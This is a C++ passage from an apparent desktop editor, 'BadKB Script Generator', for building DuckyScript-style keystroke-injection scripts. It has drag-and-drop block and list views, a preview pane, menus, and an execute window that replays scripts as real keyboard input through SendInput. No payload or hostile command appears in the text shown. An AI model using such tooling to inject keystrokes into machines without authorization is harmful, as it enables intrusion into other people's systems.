    else if(t=="STRINGLN"){for(char c:v){if(g_ExecAborted)return;SHORT vk=VkKeyScanA(c);INPUT ip={};ip.type=INPUT_KEYBOARD;
        if((vk>>8)&1){ip.ki.wVk=VK_SHIFT;SendInput(1,&ip,sizeof(INPUT));}
        ip.ki.wVk=vk&0xFF;SendInput(1,&ip,sizeof(INPUT));
        ip.ki.dwFlags=KEYEVENTF_KEYUP;SendInput(1,&ip,sizeof(INPUT));
        if((vk>>8)&1){ip.ki.wVk=VK_SHIFT;ip.ki.dwFlags=KEYEVENTF_KEYUP;SendInput(1,&ip,sizeof(INPUT));}
        std::this_thread::sleep_for(std::chrono::milliseconds(5));}PressKey(VK_RETURN);}
    else if(t=="ENTER")PressKey(VK_RETURN);
    else if(t=="TAB")PressKey(VK_TAB);
    else if(t=="KEY"){int vk=KeyToVK(v);if(vk>0)PressKey(vk);}
    else if(t=="MODIFIER"){std::string mods=v;std::transform(mods.begin(),mods.end(),mods.begin(),::toupper);
        std::vector<int> keys;
        for(const auto&[name,vk]:std::map<std::string,int>{{"GUI",VK_LWIN},{"CTRL",VK_CONTROL},{"ALT",VK_MENU},{"SHIFT",VK_SHIFT}}){
            if(mods.find(name)!=std::string::npos){keys.push_back(vk);SendKey(vk,true);}}
        size_t last=mods.find_last_of(' ');std::string lastKey=last!=std::string::npos?mods.substr(last+1):mods;
        int mainVk=KeyToVK(lastKey);
        if(mainVk<0&&lastKey.size()==1){SHORT sc=VkKeyScanA(lastKey[0]);if(sc!=-1)mainVk=sc&0xFF;}
        bool lastIsMod=(lastKey=="GUI"||lastKey=="CTRL"||lastKey=="ALT"||lastKey=="SHIFT");
        if(!lastIsMod&&mainVk>0){PressKey(mainVk);}
        for(auto it=keys.rbegin();it!=keys.rend();++it)SendKey(*it,false);}
    else if(t=="REPEAT"){}
    else if(t=="LED"){int vk=KeyToVK(v);if(vk>0){SendKey(vk,true);SendKey(vk,false);}}
    else if(t=="REM"){}
}

static void ExecuteScriptAsync(){
    g_ExecAborted=false;
    int defaultDelay=0;
    for(size_t i=0;i<g_Actions.size()&&!g_ExecAborted;i++){
        const auto&a=g_Actions[i];
        if(a.type=="DEFAULT_DELAY"){defaultDelay=std::stoi(a.value.empty()?"100":a.value);continue;}
        if(a.type=="REPEAT"){
            int n=std::stoi(a.value.empty()?"1":a.value);
            if(i+1<g_Actions.size()){for(int r=0;r<n&&!g_ExecAborted;r++)ExecAction(g_Actions[i+1]);i++;}
        }else{ExecAction(a);}
        if(defaultDelay>0&&!g_ExecAborted)std::this_thread::sleep_for(std::chrono::milliseconds(defaultDelay));
    }
    g_ExecRunning=false;
}

static void ShowExecuteWindow(){
    if(!g_ExecOpen)return;
    ImGui::SetNextWindowSize(ImVec2(380,180),ImGuiCond_Appearing);
    ImGui::SetNextWindowPos(ImVec2(ImGui::GetIO().DisplaySize.x*0.5f-190,ImGui::GetIO().DisplaySize.y*0.5f-90),ImGuiCond_Appearing);
    if(ImGui::Begin("Execute Script",&g_ExecOpen,ImGuiWindowFlags_NoDocking|ImGuiWindowFlags_NoResize)){
        if(!g_ExecRunning){
            ImGui::TextWrapped("This will execute your script using real keyboard input. Switch to your target window, then click Execute.");
            ImGui::TextWrapped("Press F5 at any time to force-stop execution.");
            ImGui::Spacing();
            if(ImGui::Button("Execute (3s countdown)",ImVec2(-1,0))){
                g_ExecAborted=false;g_ExecRunning=true;g_ExecCountdown=3;
                std::thread([](){
                    for(int i=3;i>0&&!g_ExecAborted;i--){g_ExecCountdown=i;std::this_thread::sleep_for(std::chrono::seconds(1));}
                    if(!g_ExecAborted){g_ExecCountdown=0;ExecuteScriptAsync();}
                }).detach();
            }
        }else if(g_ExecCountdown>0){
            ImGui::TextColored(ImVec4(1,0.67f,0.2f,1),"Starting in %d...",g_ExecCountdown);
            ImGui::TextWrapped("Switch to your target window NOW.");
            if(ImGui::Button("Cancel",ImVec2(-1,0))){g_ExecAborted=true;g_ExecRunning=false;}
        }else{
            ImGui::TextColored(ImVec4(0,0.91f,0.53f,1),"Executing...");
            ImGui::TextWrapped("Script is running. Press F5 to force stop.");
            if(ImGui::Button("Force Stop (F5)",ImVec2(-1,0))){g_ExecAborted=true;g_ExecRunning=false;}
        }
    }ImGui::End();
    if(g_ExecRunning&&ImGui::IsKeyPressed(ImGuiKey_F5)){g_ExecAborted=true;g_ExecRunning=false;}
}

// ════════════ Palette ════════════
static void ShowPalette(){
    for(const auto&gr:g_Palette){
        if(ImGui::CollapsingHeader(gr.name.c_str(),ImGuiTreeNodeFlags_DefaultOpen)){
            for(const auto&it:gr.items){
                ImGui::PushID(it.label.c_str());
                if(ImGui::Button(it.label.c_str(),ImVec2(ImGui::GetContentRegionAvail().x,0))){
                    if(NeedsInput(it.type,it.value))OpenInputPrompt(it.type,it.value);
                    else{PushUndo();g_Actions.push_back({it.type,it.value});g_SelectedIndex=(int)g_Actions.size()-1;g_Dirty=true;}
                }
                if(ImGui::BeginDragDropSource(ImGuiDragDropFlags_None)){
                    DragPayload p{it.type,it.value,-1};ImGui::SetDragDropPayload("ACT",&p,sizeof(p));
                    ImGui::TextUnformatted(it.label.c_str());ImGui::EndDragDropSource();
                }
                if(ImGui::IsItemHovered()&&!it.tooltip.empty()){ImGui::BeginTooltip();ImGui::TextUnformatted(it.tooltip.c_str());ImGui::EndTooltip();}
                ImGui::PopID();
            }
        }
    }
}

// ════════════ Scratch Canvas ════════════
static ImVec4 ScratchBlockColor(const std::string&t){
    if(t=="DELAY"||t=="DEFAULT_DELAY") return ImVec4(0.91f, 0.55f, 0.20f, 1.0f); // brighter orange
    if(t=="STRING"||t=="STRINGLN") return ImVec4(0.55f, 0.29f, 0.75f, 1.0f);     // purple
    if(t=="ENTER"||t=="TAB"||t=="KEY") return ImVec4(0.96f, 0.73f, 0.22f, 1.0f); // yellow
    if(t=="MODIFIER") return ImVec4(0.26f, 0.53f, 0.85f, 1.0f);                  // blue
    if(t=="REPEAT") return ImVec4(0.91f, 0.55f, 0.20f, 1.0f);
    if(t=="REM") return ImVec4(0.55f, 0.55f, 0.60f, 1.0f);
    return ImVec4(0.55f, 0.55f, 0.60f, 1.0f);
}

static void DrawScratchBlock(ImDrawList*dl,ImVec2 pos,float w,const Action&a,bool sel,bool dragGhost){
    ImVec4 c=ScratchBlockColor(a.type);
    ImVec4 cd=ImVec4(c.x*0.55f,c.y*0.55f,c.z*0.55f,1.0f); // darker border
    ImVec4 ch=ImVec4(std::min(1.0f,c.x*1.35f),std::min(1.0f,c.y*1.35f),std::min(1.0f,c.z*1.35f),0.85f); // strong highlight
    float h=37.0f;
    float notchW=32.0f, notchD=7.0f;
    float tabW=30.0f, tabH=7.0f;
    float x=pos.x, y=pos.y;
    float r=5.0f;

    std::vector<ImVec2> pts;
    pts.push_back(ImVec2(x, y));
    pts.push_back(ImVec2(x + notchW*0.4f, y));
    pts.push_back(ImVec2(x + notchW*0.5f, y + notchD));
    pts.push_back(ImVec2(x + notchW*0.6f, y + notchD));
    pts.push_back(ImVec2(x + notchW, y));
    pts.push_back(ImVec2(x + w, y));
    pts.push_back(ImVec2(x + w, y + h));
    float tabStart = x + w*0.5f - tabW*0.5f;
    pts.push_back(ImVec2(tabStart + tabW, y + h));
    pts.push_back(ImVec2(tabStart + tabW - 5, y + h - tabH));
    pts.push_back(ImVec2(tabStart + 5, y + h - tabH));
    pts.push_back(ImVec2(tabStart, y + h));
    pts.push_back(ImVec2(x, y + h));

    // Shadow
    if(!dragGhost){
        std::vector<ImVec2> spts = pts;
        for(auto& p : spts){ p.x += 3; p.y += 4; }
        dl->AddConvexPolyFilled(spts.data(), (int)spts.size(), ImColor(0.0f,0.0f,0.0f,0.35f));    }

    // Main block
    dl->AddConvexPolyFilled(pts.data(), (int)pts.size(), ImColor(c.x, c.y, c.z, sel?0.98f : 0.92f));

    // Diagonal highlight (like in your image)
    dl->AddPolyline(&pts[0], 6, ImColor(ch.x, ch.y, ch.z, 0.7f), 0, 3.5f);

    // Border
    dl->AddPolyline(pts.data(), (int)pts.size(), ImColor(cd.x, cd.y, cd.z, 1.0f), ImDrawFlags_Closed, 2.5f);

    if(!dragGhost){
        // Label
        std::string label = a.type;
        if(label=="MODIFIER") label = "key combo";
        if(label=="REPEAT") label = "repeat";
        float lx = x + 14;
        float ly = y + (h - ImGui::GetFontSize())*0.5f + 1;
        dl->AddText(ImGui::GetFont(), ImGui::GetFontSize(), ImVec2(lx, ly), ImColor(1.0f,1.0f,1.0f,1.0f), label.c_str());

        // Value bubble
        std::string v = a.value;
        if(!v.empty() && a.type != "REM" && a.type != "ENTER" && a.type != "TAB"){
            ImVec2 vs = ImGui::CalcTextSize(v.c_str());
            float ow = vs.x + 22, oh = vs.y + 9;
            if(ow > w - 90) ow = w - 90;
            float ox = x + w - ow - 14;
            float oy = y + (h - oh)*0.5f;
            dl->AddRectFilled(ImVec2(ox,oy), ImVec2(ox+ow,oy+oh), ImColor(1.0f,1.0f,1.0f,0.95f), 8.0f);
            dl->AddRect(ImVec2(ox,oy), ImVec2(ox+ow,oy+oh), ImColor(0.15f,0.15f,0.15f,0.7f), 8.0f, 0, 1.8f);
            dl->AddText(ImVec2(ox + (ow-vs.x)*0.5f, oy + (oh-vs.y)*0.5f +1), ImColor(0.05f,0.05f,0.1f,1.0f), v.c_str());
        }
    }
}

static void ShowCanvasScratch(){
    ImGui::BeginChild("CanvasScroll2",ImVec2(0,0),ImGuiChildFlags_None,ImGuiWindowFlags_NoMove);
    if(g_Actions.empty()){
        ImVec2 c=ImGui::GetContentRegionAvail();ImGui::Dummy(ImVec2(0,c.y*0.35f));
        ImGui::SetCursorPosX(ImGui::GetCursorPosX()+ImGui::GetContentRegionAvail().x*0.3f);
        ImGui::TextDisabled("Click blocks in the palette or drag them here");
    }

    int remove_at=-1,move_from=-1,move_to=-1;
    float blockH=38.0f; // adjusted for new taller blocks
    ImDrawList*dl=ImGui::GetWindowDrawList();

    for(int i=0;i<(int)g_Actions.size();i++){
        if(i==g_DragSourceIdx)continue;
        const auto&a=g_Actions[i];bool sel=(i==g_SelectedIndex);
        ImGui::PushID(i);
        float bw=ImGui::GetContentRegionAvail().x-12;
        ImVec2 cp=ImGui::GetCursorScreenPos();cp.x+=6;
        ImGui::InvisibleButton("##sbtn",ImVec2(bw+6,blockH));
        ImVec2 rmin=ImGui::GetItemRectMin(),rmax=ImGui::GetItemRectMax();

        DrawScratchBlock(dl,cp,bw,a,sel,false);

        if(ImGui::IsItemClicked())g_SelectedIndex=i;
        if(ImGui::IsItemHovered()&&ImGui::IsMouseDoubleClicked(ImGuiMouseButton_Left)&&a.type!="ENTER"&&a.type!="TAB")g_EditOpen=true;
        if(ImGui::BeginPopupContextItem("ctx")){g_SelectedIndex=i;
            if(ImGui::MenuItem("Edit")&&a.type!="ENTER"&&a.type!="TAB")g_EditOpen=true;
            if(ImGui::MenuItem("Duplicate")){PushUndo();g_Actions.insert(g_Actions.begin()+i+1,a);g_SelectedIndex=i+1;}
            if(ImGui::MenuItem("Move Up")&&i>0){move_from=i;move_to=i-1;}
            if(ImGui::MenuItem("Move Down")&&i<(int)g_Actions.size()-1){move_from=i;move_to=i+2;}
            ImGui::Separator();if(ImGui::MenuItem("Delete"))remove_at=i;
            ImGui::EndPopup();}
        if(ImGui::BeginDragDropSource(ImGuiDragDropFlags_None)){if(g_DragSourceIdx<0)g_DragSourceIdx=i;
            DragPayload p{a.type,a.value,i};ImGui::SetDragDropPayload("ACT",&p,sizeof(p));
            ImGui::Text("%s",a.type.c_str());ImGui::EndDragDropSource();}
        if(ImGui::BeginDragDropTarget()){const ImGuiPayload*pl=ImGui::AcceptDragDropPayload("ACT");
            if(pl){auto*pd=(const DragPayload*)pl->Data;int src=pd->source_index;
                if(src>=0){int ti=(src>i?i+1:i);if(src!=ti&&src!=ti-1){move_from=src;move_to=ti;}}
                else{PushUndo();Action na{pd->type,pd->value};g_Actions.insert(g_Actions.begin()+i,na);g_SelectedIndex=i;g_Dirty=true;if(NeedsInput(pd->type,pd->value))OpenInputPrompt(pd->type,pd->value);}
                g_DragSourceIdx=-1;}ImGui::EndDragDropTarget();}
        if(ImGui::IsItemHovered(ImGuiHoveredFlags_AllowWhenBlockedByActiveItem)){
            float mid=rmin.y+(rmax.y-rmin.y)*0.5f;g_DropInsertPos=(ImGui::GetMousePos().y>mid)?i+1:i;}
        ImGui::PopID();
    }

    // End-of-list drop target
    if(ImGui::BeginDragDropTarget()){const ImGuiPayload*pl=ImGui::AcceptDragDropPayload("ACT");
        if(pl){auto*pd=(const DragPayload*)pl->Data;int src=pd->source_index;
            if(src>=0){move_from=src;move_to=(int)g_Actions.size();}
            else{PushUndo();Action na{pd->type,pd->value};g_Actions.push_back(na);g_SelectedIndex=(int)g_Actions.size()-1;g_Dirty=true;if(NeedsInput(pd->type,pd->value))OpenInputPrompt(pd->type,pd->value);}
            g_DragSourceIdx=-1;}ImGui::EndDragDropTarget();}

    // Ghost
    if(g_DragSourceIdx>=0&&g_DragSourceIdx<(int)g_Actions.size()&&ImGui::IsMouseDragging(ImGuiMouseButton_Left)){
        auto&da=g_Actions[g_DragSourceIdx];ImVec2 mp=ImGui::GetMousePos();
        DrawScratchBlock(ImGui::GetForegroundDrawList(),mp,ImGui::GetWindowWidth()*0.7f,da,true,true);
    }
    if(!ImGui::IsMouseDown(ImGuiMouseButton_Left))g_DragSourceIdx=-1;
    ImGui::EndChild();

    if(remove_at>=0){PushUndo();g_Actions.erase(g_Actions.begin()+remove_at);g_SelectedIndex=-1;}
    if(move_from>=0&&move_to>=0){PushUndo();auto act=g_Actions[move_from];g_Actions.erase(g_Actions.begin()+move_from);
        int ins=(move_to>move_from)?move_to-1:move_to;if(ins<0)ins=0;if(ins>(int)g_Actions.size())ins=(int)g_Actions.size();
        g_Actions.insert(g_Actions.begin()+ins,act);g_SelectedIndex=ins;}
}

// ════════════ Normal Canvas ════════════
static void ShowCanvas(){
    ImGui::BeginChild("CanvasScroll",ImVec2(0,0),ImGuiChildFlags_None,ImGuiWindowFlags_NoMove);

    if(g_Actions.empty()){
        ImVec2 c=ImGui::GetContentRegionAvail();ImGui::Dummy(ImVec2(0,c.y*0.35f));
        ImGui::SetCursorPosX(ImGui::GetCursorPosX()+ImGui::GetContentRegionAvail().x*0.25f);
        ImGui::TextDisabled("Click actions in the palette panel or drag them here");
    }

    ImGui::PushStyleVar(ImGuiStyleVar_FramePadding,ImVec2(6,4));
    ImGui::PushStyleVar(ImGuiStyleVar_ItemSpacing,ImVec2(0,2));

    int remove_at=-1,move_from=-1,move_to=-1;
    DragPayload drop_from_palette;

    for(int i=0;i<(int)g_Actions.size();i++){
        if(i==g_DragSourceIdx)continue; // hide while dragging
        ImGui::PushID(i);const auto&a=g_Actions[i];ImVec4 c=TypeColor(a.type);bool sel=(i==g_SelectedIndex);

        ImGui::PushStyleColor(ImGuiCol_Button,ImVec4(0.08f,0.10f,0.16f,1.0f));
        if(sel)ImGui::PushStyleColor(ImGuiCol_Border,ImVec4(c.x,c.y,c.z,0.8f));else ImGui::PushStyleColor(ImGuiCol_Border,ImVec4(0.12f,0.16f,0.23f,1.0f));
        ImGui::PushStyleVar(ImGuiStyleVar_FrameBorderSize,sel?2.0f:1.0f);

        std::string label="  "+a.type+"  ",val_text=a.value;
        if(a.type=="STRING"&&val_text.size()>50)val_text=val_text.substr(0,50)+"...";

        ImGui::Button("##btn",ImVec2(ImGui::GetContentRegionAvail().x,0));
        ImVec2 bmin=ImGui::GetItemRectMin(),bmax=ImGui::GetItemRectMax();
        float rowH=bmax.y-bmin.y;

        // Draw drop insertion line
        if(g_DropInsertPos==i){
            ImGui::GetWindowDrawList()->AddLine(ImVec2(bmin.x+4,bmin.y),ImVec2(bmax.x-4,bmin.y),ImColor(0.39f,0.59f,0.86f,1.0f),2.0f);
        }

        // Draw badge
        ImDrawList*dl=ImGui::GetWindowDrawList();
        float bx=bmin.x+8;ImVec2 ls=ImGui::CalcTextSize(label.c_str());
        float bh=ls.y+6,by=bmin.y+(rowH-bh)*0.5f;
        dl->AddRectFilled(ImVec2(bx,by),ImVec2(bx+ls.x+10,by+bh),ImColor(c.x,c.y,c.z,0.25f),4.0f);
        dl->AddText(ImVec2(bx+5,by+3),ImColor(c.x,c.y,c.z,1.0f),label.c_str());

        if(!val_text.empty()){
            ImVec4 vc=(a.type=="REM")?ImVec4(0.42f,0.48f,0.60f,1.0f):ImVec4(0.85f,0.89f,0.97f,1.0f);
            float vx=bx+ls.x+22;ImVec2 vs=ImGui::CalcTextSize(val_text.c_str());
            dl->AddText(ImVec2(vx,bmin.y+(rowH-vs.y)*0.5f),ImColor(vc.x,vc.y,vc.z,1.0f),val_text.c_str());
        }

        ImGui::PopStyleVar();ImGui::PopStyleColor(2);

        if(ImGui::IsItemClicked())g_SelectedIndex=i;
        if(ImGui::IsItemHovered()&&ImGui::IsMouseDoubleClicked(ImGuiMouseButton_Left)&&a.type!="ENTER"&&a.type!="TAB")g_EditOpen=true;
        if(ImGui::BeginPopupContextItem("ctx")){g_SelectedIndex=i;
            if(ImGui::MenuItem("Edit")&&a.type!="ENTER"&&a.type!="TAB")g_EditOpen=true;
            if(ImGui::MenuItem("Duplicate")){PushUndo();g_Actions.insert(g_Actions.begin()+i+1,a);g_SelectedIndex=i+1;}
            if(ImGui::MenuItem("Move Up")&&i>0){move_from=i;move_to=i-1;}
            if(ImGui::MenuItem("Move Down")&&i<(int)g_Actions.size()-1){move_from=i;move_to=i+2;}
            ImGui::Separator();if(ImGui::MenuItem("Delete"))remove_at=i;
            ImGui::EndPopup();}

        // Drag source (from canvas)
        if(ImGui::BeginDragDropSource(ImGuiDragDropFlags_None)){
            if(g_DragSourceIdx<0)g_DragSourceIdx=i;
            DragPayload p{a.type,a.value,i};ImGui::SetDragDropPayload("ACT",&p,sizeof(p));
            ImGui::Text("%s %s",a.type.c_str(),val_text.c_str());ImGui::EndDragDropSource();
        }

        // Drop target on this row
        if(ImGui::BeginDragDropTarget()){
            const ImGuiPayload* pl=ImGui::AcceptDragDropPayload("ACT");
            if(pl){auto*pd=(const DragPayload*)pl->Data;
                int src=pd->source_index;
                if(src>=0){
                    int ti=(src>i?i+1:i);
                    if(src!=ti&&src!=ti-1){move_from=src;move_to=ti;}
                }else{PushUndo();Action na{pd->type,pd->value};g_Actions.insert(g_Actions.begin()+i,na);g_SelectedIndex=i;g_Dirty=true;if(NeedsInput(pd->type,pd->value))OpenInputPrompt(pd->type,pd->value);}
                g_DragSourceIdx=-1;
            }ImGui::EndDragDropTarget();}

        // Track drop insert position while dragging
        if(ImGui::IsItemHovered(ImGuiHoveredFlags_AllowWhenBlockedByActiveItem)){
            float mid=bmin.y+rowH*0.5f;g_DropInsertPos=(ImGui::GetMousePos().y>mid)?i+1:i;
        }
        ImGui::PopID();
    }

    // Drop indicator at end
    if(g_DropInsertPos==(int)g_Actions.size()){float lastY=0;if(!g_Actions.empty())lastY=ImGui::GetItemRectMax().y;
        ImGui::GetWindowDrawList()->AddLine(ImVec2(12,lastY+1),ImVec2(ImGui::GetWindowWidth()-12,lastY+1),ImColor(0.39f,0.59f,0.86f,1.0f),2.0f);}

    // Global canvas drop target (empty area / end of list)
    if(ImGui::BeginDragDropTarget()){
        const ImGuiPayload* pl=ImGui::AcceptDragDropPayload("ACT");
        if(pl){auto*pd=(const DragPayload*)pl->Data;
            int src=pd->source_index;
            if(src>=0){move_from=src;move_to=(int)g_Actions.size();}
            else{PushUndo();Action na{pd->type,pd->value};g_Actions.push_back(na);g_SelectedIndex=(int)g_Actions.size()-1;g_Dirty=true;if(NeedsInput(pd->type,pd->value))OpenInputPrompt(pd->type,pd->value);}
            g_DragSourceIdx=-1;
        }ImGui::EndDragDropTarget();}

    // Ghost: draw dragged item at cursor
    if(g_DragSourceIdx>=0&&g_DragSourceIdx<(int)g_Actions.size()&&ImGui::IsMouseDragging(ImGuiMouseButton_Left)){
        auto&da=g_Actions[g_DragSourceIdx];ImVec4 tc=TypeColor(da.type);
        ImVec2 mp=ImGui::GetMousePos();float gw=ImGui::GetWindowWidth()*0.7f;
        ImDrawList*dl=ImGui::GetForegroundDrawList();
        dl->AddRectFilled(ImVec2(mp.x,mp.y),ImVec2(mp.x+gw,mp.y+28),ImColor(0.08f,0.10f,0.16f,0.85f),6.0f);
        dl->AddRect(ImVec2(mp.x,mp.y),ImVec2(mp.x+gw,mp.y+28),ImColor(tc.x,tc.y,tc.z,0.6f),6.0f);
        std::string gl="  "+da.type+"  ";ImVec2 ls=ImGui::CalcTextSize(gl.c_str());
        dl->AddRectFilled(ImVec2(mp.x+6,mp.y+4),ImVec2(mp.x+ls.x+16,mp.y+24),ImColor(tc.x,tc.y,tc.z,0.3f),4.0f);
        dl->AddText(ImVec2(mp.x+11,mp.y+7),ImColor(tc.x,tc.y,tc.z,1.0f),gl.c_str());
    }
    if(!ImGui::IsMouseDown(ImGuiMouseButton_Left))g_DragSourceIdx=-1;

    ImGui::PopStyleVar(2);ImGui::EndChild();

    if(remove_at>=0){PushUndo();g_Actions.erase(g_Actions.begin()+remove_at);g_SelectedIndex=-1;}
    if(move_from>=0&&move_to>=0){PushUndo();auto act=g_Actions[move_from];g_Actions.erase(g_Actions.begin()+move_from);
        int ins=(move_to>move_from)?move_to-1:move_to;if(ins<0)ins=0;if(ins>(int)g_Actions.size())ins=(int)g_Actions.size();
        g_Actions.insert(g_Actions.begin()+ins,act);g_SelectedIndex=ins;}
    if(!ImGui::IsWindowHovered(ImGuiHoveredFlags_ChildWindows))g_DropInsertPos=-1;
}

// ════════════ Preview ════════════
static void ShowPreview(){
    ImGui::BeginChild("PreviewScroll",ImVec2(0,0),ImGuiChildFlags_None,ImGuiWindowFlags_NoMove);
    ImGui::PushFont(g_MonoFont);ImGui::TextUnformatted(GenerateScript().c_str());ImGui::PopFont();
    ImGui::EndChild();
}

// ════════════ Main ════════════
int main(){
    if(!glfwInit())return 1;
    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR,3);glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR,2);
    glfwWindowHint(GLFW_OPENGL_PROFILE,GLFW_OPENGL_CORE_PROFILE);
    glfwWindowHint(GLFW_DECORATED,GLFW_FALSE);
    GLFWwindow*w=glfwCreateWindow(1280,820,"BadKB — Script Generator",nullptr,nullptr);
    if(!w){glfwTerminate();return 1;}glfwMakeContextCurrent(w);glfwSwapInterval(1);LoadGLFunctions();

    // Set duck icon via Win32
    HWND hwnd=GetActiveWindow();
    if(!hwnd){EnumWindows([](HWND h,LPARAM l)->BOOL{DWORD pid;GetWindowThreadProcessId(h,&pid);if(pid==GetCurrentProcessId()){*(HWND*)l=h;return FALSE;}return TRUE;},(LPARAM)&hwnd);}
    g_hwnd=hwnd;
    HICON hIcon=(HICON)LoadImageA(GetModuleHandleA(nullptr),"src\\duck.ico",IMAGE_ICON,32,32,LR_LOADFROMFILE|LR_DEFAULTSIZE);
    if(!hIcon)hIcon=(HICON)LoadImageA(GetModuleHandleA(nullptr),"duck.ico",IMAGE_ICON,32,32,LR_LOADFROMFILE|LR_DEFAULTSIZE);
    if(hIcon){SendMessageA(hwnd,WM_SETICON,ICON_BIG,(LPARAM)hIcon);SendMessageA(hwnd,WM_SETICON,ICON_SMALL,(LPARAM)hIcon);}

    // Rounded corners
    int corner=DWMWCP_ROUND;DwmSetWindowAttribute(hwnd,DWMWA_WINDOW_CORNER_PREFERENCE,&corner,sizeof(corner));

    IMGUI_CHECKVERSION();ImGui::CreateContext();ImGuiIO&io=ImGui::GetIO();
    io.ConfigFlags|=ImGuiConfigFlags_DockingEnable;io.IniFilename=nullptr;
    SetupFlopwareTheme();
    ImFontConfig fc;fc.SizePixels=13.0f;
    g_MonoFont=io.Fonts->AddFontFromFileTTF("C:\\Windows\\Fonts\\consola.ttf",13.0f,&fc);
    if(!g_MonoFont)g_MonoFont=io.Fonts->AddFontDefault();

    // Load duck texture
    int ch;unsigned char* px=stbi_load("src\\duck.png",&g_DuckW,&g_DuckH,&ch,4);
    if(px){glGenTextures(1,&g_DuckTex);glBindTexture(GL_TEXTURE_2D,g_DuckTex);
        glTexImage2D(GL_TEXTURE_2D,0,GL_RGBA,g_DuckW,g_DuckH,0,GL_RGBA,GL_UNSIGNED_BYTE,px);
        glTexParameteri(GL_TEXTURE_2D,GL_TEXTURE_MIN_FILTER,GL_LINEAR);
        glTexParameteri(GL_TEXTURE_2D,GL_TEXTURE_MAG_FILTER,GL_LINEAR);
        glBindTexture(GL_TEXTURE_2D,0);stbi_image_free(px);}
    ImGui_ImplGlfw_InitForOpenGL(w,true);ImGui_ImplOpenGL3_Init("#version 130");

    // Drag-and-drop file loading
    glfwSetDropCallback(w,[](GLFWwindow*,int count,const char**paths){
        if(count>0)LoadFromFile(paths[0]);
    });

    while(!glfwWindowShouldClose(w)){
        glfwPollEvents();ImGui_ImplOpenGL3_NewFrame();ImGui_ImplGlfw_NewFrame();ImGui::NewFrame();

        ImGui::SetNextWindowPos(ImVec2(0,0));ImGui::SetNextWindowSize(io.DisplaySize);
        ImGui::Begin("Main",nullptr,ImGuiWindowFlags_NoTitleBar|ImGuiWindowFlags_NoResize|ImGuiWindowFlags_NoMove|ImGuiWindowFlags_NoBringToFrontOnFocus|ImGuiWindowFlags_NoScrollbar|ImGuiWindowFlags_NoScrollWithMouse);

        // ── Custom title bar ──
        ImDrawList*tdl=ImGui::GetWindowDrawList();
        ImVec2 tp=ImGui::GetCursorScreenPos();float th=28.0f;
        ImVec2 tr=ImVec2(tp.x+ImGui::GetWindowWidth(),tp.y+th);
        tdl->AddRectFilled(tp,tr,ImColor(0.06f,0.08f,0.13f,1.0f));
        tdl->AddLine(ImVec2(tp.x,tr.y),ImVec2(tr.x,tr.y),ImColor(0.10f,0.13f,0.20f,1.0f));
        ImGui::SetCursorScreenPos(ImVec2(tp.x+12,tp.y+4));
        ImGui::TextDisabled("BadKB");ImGui::SameLine(0,4);ImGui::TextUnformatted("Script Generator");
        ImGui::SetCursorScreenPos(ImVec2(tr.x-76,tp.y+2));
        if(ImGui::Button("-##min",ImVec2(28,24)))glfwIconifyWindow(w);
        ImGui::SameLine(0,4);
        if(ImGui::Button("X##close",ImVec2(28,24)))glfwSetWindowShouldClose(w,GLFW_TRUE);
        ImGui::SetCursorScreenPos(tp);
        ImGui::InvisibleButton("##titledrag",ImVec2(ImGui::GetWindowWidth()-86,th));
        if(ImGui::IsItemActivated()){glfwGetWindowPos(w,&g_TitleWinX,&g_TitleWinY);POINT cp;GetCursorPos(&cp);g_TitleStartX=cp.x;g_TitleStartY=cp.y;g_TitleDragging=true;}
        if(g_TitleDragging&&ImGui::IsMouseReleased(ImGuiMouseButton_Left))g_TitleDragging=false;
        ImGui::SetCursorScreenPos(ImVec2(tp.x,tp.y+th));

        // ── Custom menu bar ──
        float mbh=24.0f;ImVec2 mbp=ImGui::GetCursorScreenPos();
        ImVec2 mbr=ImVec2(mbp.x+ImGui::GetWindowWidth(),mbp.y+mbh);
        tdl->AddRectFilled(mbp,mbr,ImColor(0.06f,0.08f,0.13f,1.0f));
        tdl->AddLine(ImVec2(mbp.x,mbr.y),ImVec2(mbr.x,mbr.y),ImColor(0.10f,0.13f,0.20f,1.0f));

        bool do_new=false,do_open=false,do_save=false,do_save_as=false,do_undo=false,do_redo=false,do_copy=false,do_template=false;int tidx=-1;
        ImGui::SetCursorScreenPos(ImVec2(mbp.x+8,mbp.y+2));
        if(ImGui::Button("File",ImVec2(40,22)))ImGui::OpenPopup("##filemenu");
        if(ImGui::BeginPopup("##filemenu")){
                if(ImGui::MenuItem("New","Ctrl+N"))do_new=true;
                if(ImGui::MenuItem("Open...","Ctrl+O"))do_open=true;
                if(ImGui::MenuItem("Save","Ctrl+S"))do_save=true;
                if(ImGui::MenuItem("Save As...","Ctrl+Shift+S"))do_save_as=true;
                ImGui::Separator();
                if(ImGui::MenuItem("Execute (F5)"))g_ExecOpen=true;
                ImGui::Separator();
                if(ImGui::MenuItem("Exit"))glfwSetWindowShouldClose(w,GLFW_TRUE);
                ImGui::EndPopup();}
        ImGui::SameLine();
        if(ImGui::Button("Edit",ImVec2(40,22)))ImGui::OpenPopup("##editmenu");
        if(ImGui::BeginPopup("##editmenu")){
                if(ImGui::MenuItem("Undo","Ctrl+Z"))do_undo=true;
                if(ImGui::MenuItem("Redo","Ctrl+Y"))do_redo=true;
                ImGui::Separator();
                if(ImGui::MenuItem("Copy Script","Ctrl+Shift+C"))do_copy=true;
                if(ImGui::MenuItem("Delete Selected","Del")&&g_SelectedIndex>=0){PushUndo();g_Actions.erase(g_Actions.begin()+g_SelectedIndex);g_SelectedIndex=-1;}
                ImGui::EndPopup();}
        ImGui::SameLine();
        if(ImGui::Button("Templates",ImVec2(80,22)))ImGui::OpenPopup("##templmenu");
        if(ImGui::BeginPopup("##templmenu")){
                for(int i=0;i<(int)g_Templates.size();i++)if(ImGui::MenuItem(g_Templates[i].name.c_str())){do_template=true;tidx=i;}
                ImGui::EndPopup();}
        ImGui::SameLine();
        if(ImGui::Button("Help",ImVec2(40,22)))ImGui::OpenPopup("##helpmenu");
        if(ImGui::BeginPopup("##helpmenu")){
                if(ImGui::MenuItem("Documentation"))g_DocsOpen=true;
                ImGui::EndPopup();}
        ImGui::SetCursorScreenPos(ImVec2(mbp.x,mbp.y+mbh));

        if(ImGui::IsKeyChordPressed(ImGuiMod_Ctrl|ImGuiKey_N)||do_new){if(!g_Actions.empty()){PushUndo();g_Actions.clear();g_Filename.clear();g_SelectedIndex=-1;g_Dirty=false;}}
        if(ImGui::IsKeyChordPressed(ImGuiMod_Ctrl|ImGuiKey_O)||do_open)g_OpenFileOpen=true;
